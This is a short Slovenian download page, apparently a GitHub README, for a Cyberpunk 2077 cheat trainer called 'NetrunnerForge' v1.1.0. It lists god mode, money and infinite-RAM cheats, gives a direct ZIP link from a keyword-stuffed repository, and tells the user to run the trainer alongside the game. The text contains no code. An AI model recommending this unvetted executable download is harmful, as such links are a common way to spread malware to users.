...
**NetrunnerForge +46** za **Cyberpunk 2077** (+ **Phantom Liberty**).
Trenutna različica: **v1.1.0**.

Čiti: God Mode, Money, One Hit, No Reload, Infinite RAM, XP, Street Cred.
...
> Neposredna povezava ZIP (**v1.1.0**):

**→ [Prenesi Cyberpunk2077_NetrunnerForgeTrainer.V1.1.0.zip](https://github.com/TrainerHubMoggyDay/Cyberpunk-2077-Trainer-GodMode-Money-OneHit-NoReload-InfiniteRAM/releases/download/v1.1.0/Cyberpunk2077_NetrunnerForgeTrainer.V1.1.0.zip)**
...
Po prenosu: zaženi igro → zaženi trainer → počakaj `Cyberpunk2077.exe` → vklopi funkcije.

---

## Changelog

### [v1.1.0](https://github.com/TrainerHubMoggyDay/Cyberpunk-2077-Trainer-GodMode-Money-OneHit-NoReload-InfiniteRAM/releases/tag/v1.1.0) — aktualno
...
**Kje prenesti?**  
Zeleni gumb ali ZIP v1.1.0 (TrainerHub MoggyDay).

**Kaj je novo v v1.1.0?**  
Popravek attach, God Mode/No Reload/RAM, Money, One Hit, Relic Points, XP.
